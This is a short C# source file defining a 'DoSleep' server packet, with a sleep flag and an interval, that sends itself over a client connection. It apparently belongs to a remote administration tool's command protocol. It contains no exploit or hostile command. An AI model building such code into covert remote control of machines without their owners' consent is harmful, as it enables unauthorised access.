﻿using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoSleep : IPacket
    {
        public bool IsSleep { get; set; }

        public int Interval { get; set; }

        public DoSleep()
        {

        }

        public DoSleep(bool isSleep, int interval)
        {
            IsSleep = isSleep;
            Interval = interval;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}